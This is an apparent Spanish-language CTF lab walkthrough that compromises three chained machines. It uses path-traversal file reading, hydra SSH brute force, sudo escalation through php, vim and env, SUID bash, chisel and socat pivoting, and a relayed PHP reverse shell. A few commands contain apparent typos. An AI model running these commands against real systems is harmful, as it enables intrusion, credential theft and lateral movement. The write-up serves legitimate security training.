# Enumeracion de Puertos, Servicios y Versiones
nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 10.10.10.2 -oN nmap

22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
http-enum: 
|_  /shop/: Potentially interesting folder


# Fuzzing web

gobuster dir -u http://10.10.10.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,py,js,png,jpg

===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/shop                 (Status: 301) [Size: 307] [--> http://10.10.10.2/shop/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1661144 / 1661152 (100.00%)
===============================================================

al chequear el servicio web principal lo que vemos es la plantilla de apache, reviso el codigo fuente y no consigo nada, chequeo en http://10.10.10.2/shop/
y vemos una imagen y al pie de pagina observamos :  "Error de Sistema: ($_GET['archivo']");
al ver esto, podria intentar leer archivos del sistema usando el parametro archivo, asi que vamos a verificar si es posible

wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.2/shop/?FUZZ=../../../../../../../../etc/passwd" --hl 44

000014842:   200        68 L     117 W      2253 Ch     "archivo"                                                                                              


con este resultado confirmamos que en efecto podemos leer archivos en el sistema asi que en la barra url del navegador colocamos:

http://10.10.10.2/shop/?archivo=../../../../../../../../etc/passwd

y hemos podido leer el archivo /etc/passwd donde podremos ver los usuarios del sistema

root:x:0:0:root:/root:/bin/bash
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash

como conocemos los usuarios del sistema y vimos que el puerto 22 esta activo corriendo ssh, aplicamos un ataque de diccionario 
a ver si conseguimos la passwd de alguno de los usuarios


# Ataque de Diccionario al Servicio SSH

hydra -l manchi -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://10.10.10.2 -t 64 -I
[22][ssh] host: 10.10.10.2   login: manchi   password: lovely

conseguida las credenciales nos conectamos via ssh

# Intruccion al Sistema

ssh manchi@10.10.10.2
passwd: lovely

sudo -l						| no podemos ejecutaar sudo
find / -perm -4000 2>/dev/null			| nada por aqui
find / -type f -perm o+x 2>/dev/null		| nada por aqui

reviso el sistema pero no consigo nada, asi que intentare con un ataque de diccionario contra el otro usuario del sistema.
por lo que enviare un script para el ataque y un diccionario a la maquina comprometida

scp /home/darks/Desktop/Kali/diccionarios/rockyou.txt manchi@10.10.10.2:/home/manchi
scp /home/darks/Desktop/Kali/Linux-Su-Force.sh manchi@10.10.10.2:/home/manchi

con esto enviamos el script y el diccionario, asi que nos vamos a la instancia ssh de manchi y vemos si conseguimos algo
con el ataque por diccionario

chmod +x Linux-Su-Force.sh
./Linux-Su-Force.sh seller rockyou.txt
Contraseña encontrada para el usuario seller: qwerty
su seller
passwd: qwerty

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
			    |
ahora somo el usuario seller|
-----------------------------

sudo -l
User seller may run the following commands on 9b0b1eb8f6ec:
    (ALL) NOPASSWD: /usr/bin/php

< Buscamos el binario php en Searchbins o GTFOBINS y escalamos >
	| CMD="/bin/bash"
	| sudo php -r "system('$CMD');"

cmd= "/bin/bash"
sudo /usr/bin/php -r "system('$CMD');"
#root
chmod u+s /bin/bash
exit
(hemos vuelto al usuarios seller)
/bin/bash -p
# root
hostname -I
10.10.10.2 20.20.20.2
_____________________________________________________________________________________________
como tenemos una red mas, enviare desde mi maquina atacante un script en bash para detectar 
las ip's que esten activas en esa red

scp scan.sh manchi@10.10.10.2:/home/manchi		| script enviado
ahora nos vamos a la instancia ssh y ejecutamos el script
---------------------------------------------------------------------------------------------
chmod +x scan.sh
./scan.sh 20.20.20.1
[+] La dirección IP es válida. Procediendo con el escaneo...

[+] Host 20.20.20.2 - ACTIVO
[+] Host 20.20.20.3 - ACTIVO

20.20.20.2 = somos nosotros
20.20.20.3 = otro equipo en la red

==================================================
Ya sabiendo que existe otra interfas de red y los
host que estan activos, usaremos chisel para crear 
un tunel por lo que enviamos desde nuestra maquina, 
chisel.

scp chisel manchi@10.10.10.2:/home/manchi		| enviamos chisel de nuestra maquina a la comprometida
./chisel server --reverse -p 90				| ejecutamos chisel en nuestra maquina atacante
==================================================
desde la Maquina Comprometida:
./chisel client 10.10.10.1:90 R:socks			| ejecutamos chisel desde la maquina comprometida


se crea el tunel tcp redireccionando el trafico a nuestra maquina atacante
2024/09/04 19:24:44 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

desde nuestra maquina atacante editamos el archivo /etc/proxychains4.conf
nano /etc/proxychains4.conf
---------------------------------------------------------
habilitamos dynamic_chain y deshabilitamos strict_chain
y al final del todo agregamos el tunel creado con chisel

[ProxyList]
.
.
.

socks5  127.0.0.1 1080		|tunel creado por chisel
guardamos y salimos. Ya podemos hacer uso de proxychains
---------------------------------------------------------
ahora vamos a escanear con proxychains y nmap el host que se encuentra activo en la red 20.20.20.0/24 

proxychains nmap --open -Pn -sT --top-ports 50 --min-rate 5000 -vvv 20.20.20.3 2>&1 | grep -v 'proxychains'

-proxychains = para pasar por el tunel creado por chisel y llegar al host 20.20.20.3
--open = solo mostrara puertos abiertos
--Pn = omitimos el descubrimiento de hosts
-sT = Realizamos un escaneo de conexion tcp 
--top-pots 50 = solo vamos a escanear los 50 puertos mas comunes
--min-rate 5000 = tasa minima de 5000 paquetes por seg. (velocidad)
-vvv = triple verbosidad
2>&1 = tantos los mensajes normales como de errores los enviaremos a la misma salida
| = tuberia
grep -v 'proxychains' = omitimos todas las lineas que contengan 'proxychains' (limpiamos la salida)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

ahora vemos 2 servicios corriendo en 20.20.20.3, vamos a revisar el puerto 80 desde nuestro equipo
atacante, para eso debemos configurar el proxy 127.0.0.1 1080 en el navegador.

tras chequear la web en 20.20.20.3 me consigo con la plantilla apache, reviso el codigo fuente pero 
no veo nada, asi que ahora haremos fuzzing web

feroxbuster -u http://20.20.20.3 --proxy socks5://127.0.0.1:1080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js,py

──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      368l      933w    10701c http://20.20.20.3/index.html
200      GET       24l      127w    10359c http://20.20.20.3/icons/openlogo-75.png
200      GET      368l      933w    10701c http://20.20.20.3/
200      GET       39l       78w      927c http://20.20.20.3/secret.php
[####################] - 47s  1245804/1245804 0s      found:4       errors:1      
[####################] - 46s  1245774/1245774 26962/s http://20.20.20.3/ 

al revisar en el navegador la url http://20.20.20.3/secret.php, me consigo con un mensaje:
_________________________________________
hola mario, esta web no se puede hackear
-----------------------------------------

reviso el codigo fuente pero no encuentro nada, asi que tomo a mario como un posble usuario usuario y ataco
el servicio ssh

proxychains hydra -l mario -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://20.20.20.3 2>/dev/null

[22][ssh] host: 20.20.20.3   login: mario   password: chocolate

ahora nos conectamos desde nuestra maquina atacante via ssh a 20.20.20.3 que es la maquina 2

proxychains ssh manchi@20.20.20.3
passwd: lovely
_______________________________________________________________________________________________
maquina 2 & Usuario: mario|
---------------------------

sudo -l
User mario may run the following commands on d1bf1b764477:
    (ALL) /usr/bin/vim

sudo /usr/bin/vim -c ':!/bin/bash'
#root
chmod u+s /bin/bash
exit

volvemos al usuario mario y escalamos de nuevo
/bin/bash -p
#root
hostname -I
20.20.20.3 30.30.30.2 

tenemos otra interfas de red 30.30.30.0/24

intentamos hacer un reconocimiento de host pero la maquina no tiene instalado ping.
vamos hacer un diagrama de lo que llevamos hasta ahora para tener claridad.

diagrama:
-----------------------------------------------------------------------------------------------------------------
				     vulnerada			     vuelnerada			en reconocimeinto
  10.10.10.1			10.10.10.2 20.20.20.2		20.20.20.3 30.30.30.2		   30.30.30.x
								[no tiene ping instalado]
     M.A.				M.1				M.2				M3
server Chisel			   chisel cliente		   
  puerto 90														
------------------------------------------------------------------------------------------------------------------

Nuestra maquina atacante corre el servidor chisel y la maquina 1 corre un cliente de chisel que nos da visibilidad
hasta la maquina 2

ya que no podemos hacer un reconocimiento de los host's activos en la red 30.30.30.0/24 por no estar instalado ping
en la maquina 2, tendremos que hacer un reconocimiento desde nuestra maquina atacante, asi que vamos correr socat
en la maquina 1 para que redireccione el trafico que reciba de la maquina 2 hasta el servidor chisel en la maquina
atacante y asi crear un nuevo tunel que nos de visibilidad hasta la red 30.30.30.0/24
==================================================================================================================
desde nuestra maquina atacante:

scp socat manchi@10.10.10.2:/home/manchi				| enviamos a la maquina1 socat
pass: lovely
proxychains scp chisel mario@20.20.20.3:/home/mario			| enviamos a la maquina2 chisel
pass: chocolate

-------------------------------------------------------------------------------------------------------------------
nos conectamos a una nueva instancia ssh a la maquina 1

ssh manchi@10.10.10.2
pass: lovely
/bin/bash -p								| escalamos a root
./socat tcp-l:9999,fork,reuseaddr tcp:10.10.10.10.1:90

corremos socat para redireccionar al servidor chisel (10.10.10.10.1:90) lo que nos llegue al puerto 9999
--------------------------------------------------------------------------------------------------------------------
volvemos a la instancia ssh de la maquina 2 (20.20.20.3 30.30.30.2) 

./chisel client 20.20.20.2:9999 R:7000:socks

corremos chisel para enviar todo el trafico de nuestras interfaces de redes (20.20.20.3 30.30.30.2) a socat en la
maquina 1 por el puerto 9999 para que lo redireccione al servidor chisel en la maquina atacante, creando un tunel 
con el puerto 7000...
---------------------------------------------------------------------------------------------------------------------
ahora nos vamos a nuestra maquina atacante al servidor chisel y vemos que se a creado un nuevo tunel tcp
2024/09/05 13:56:24 server: session#2: tun: proxy#R:127.0.0.1:7000=>socks: Listening

asi que ahora agregamos el nuevo tunel al archivo /etc/proxychains4.conf.
recordar que debe estar habilitado el dynamic_chain para que funcione

ahora usaremos proxychains y nmap para escanear la red 30.30.30.0/24
nota: los escaneos tipos TCP SYN son conflictivos al usar proxychains asi que evitarlos


proxychains nmap --open -Pn -sT --top-ports 5 --min-rate 5000 -vvv 30.30.30.1-5 2>&1 | grep -v 'proxychains'

escanearemos desde 30.30.30.1 hasta 30.30.30.5 (5 hosts) y solo verificaremos los 5 puertos mas usados ya que
queremos hacer un reconocimiento en la red para descubrir hosts activos..

Nmap scan report for 30.30.30.2				| este es el equipo que ya hemos vulnerado
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 30.30.30.3				
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

hemos descubierto un host activo (30.30.30.3) asi que le aplicaremos un escaneo mas profundo a ver si conseguimos
mas puertos abiertos

proxychains nmap --open -Pn -sT --top-ports 100 --min-rate 5000 -sCV -vvv 30.30.30.3 2>&1 | grep -v 'proxychains'

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Upload here your file

vemos que nos sigue apareciendo solo un servicio levantado en el host 30.30.30.3 y es un servicio web levantado con 
apache, asi que configuramos nuestro navegador con el proxy 127.0.0.1:7000 y chequeamos la web en 30.30.30.3

despues de revisar la web, vemos que podemos cargar archivos, asi que primero haremos fuzzing web

feroxbuster -u http://30.30.30.3 --proxy socks5://127.0.0.1:7000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js,py

──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      310c http://30.30.30.3/uploads => http://30.30.30.3/uploads/
200      GET       54l      102w     1357c http://30.30.30.3/upload.php
200      GET       53l      104w     1361c http://30.30.30.3/index.html
200      GET       53l      104w     1361c http://30.30.30.3/
[####################] - 53s  1245798/1245798 0s      found:4       errors:1      
[####################] - 52s  1245774/1245774 23954/s http://30.30.30.3/ 
[####################] - 0s   1245774/1245774 1245774000/s http://30.30.30.3/uploads/ => Directory listing   

por lo que vemos, el sitio interpreta codigo php y vemos el directorio donde se alojan los archivos cargados, asi que vamos a preparar todo
para que nos pueda funcionar una reverse shell.. hagamos un nuevo diagrama


-----------------------------------------------------------------------------------------------------------------
                                     vulnerada                       vuelnerada                 
  10.10.10.1                    10.10.10.2 20.20.20.2           20.20.20.3 30.30.30.2              30.30.30.3
                                                                [no tiene ping instalado]
     M.A.                               M.1                             M.2                             M3
server Chisel                      chisel cliente		
  puerto 90				socat			      chisel				
 netcat 5000	      <----------       socat       <--------	       socat          <---------  reverse shell php
------------------------------------------------------------------------------------------------------------------

Ok, como vemos en el diagrama, la reverse shell debe ser enviada desde M3 a M2 y con socat redireccionarlo desde M2 a M1 
donde socat lo volvera a redireccionar hasta netcat en nuestra maquina atacante

como M1 ya tiene socat, solo lo enviaremos a M2

proxychains scp socat mario@20.20.20.3:/home/mario
pass: chocolate

ahora en nuestra maquina atacante nos podremos en escucha con netcat por el puerto 4444

nc -lnvp 4444
---------------------------------------------------------------------------------------------
ahora nos conectamos a una nueva instancia ssh a M1 para luego ejecutar socat

ssh manchi@10.10.10.2
pass: lovely
./socat tcp-l:8001,fork,reuseaddr tcp:10.10.10.1:4444
---------------------------------------------------------------------------------------------
ahora nos conectamos a una nueva instancia ssh a M2 para luego ejecutar socat

proxychains ssh mario@20.20.20.3
pass: chocolate
./socat tcp-l:8002,fork,reuseaddr tcp:20.20.20.2:8001
---------------------------------------------------------------------------------------------

ahora debemos configurar la reverse shell php para que envie la conexion a 30.30.30.2 por el
puerto 8002 y cargar el .php por el navegador, despues de cargar el .php nos vamos a la url
http://30.30.30.3/tu-archivo.php para enviarnos la reverse shell.

la reverse shell que use la puedes encontrar en: https://github.com/DarksBlackSk/reverse/blob/main/php-reverse-shell.php

nos vamos a netcat y hemos recibido la conexion
----------------------------------------------------------------------------------------------
Maquina 3 Escalada| 
------------------

tratamos la bash

script /dev/null -c bash
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash

sudo -l
User www-data may run the following commands on 3b5fd3d16604:
    (root) NOPASSWD: /usr/bin/env

sudo /usr/bin/env /bin/bash
#root
hostname -I
30.30.30.3

no hay mas interfaces de red y ya escalamos hasta root, asi que FIN.
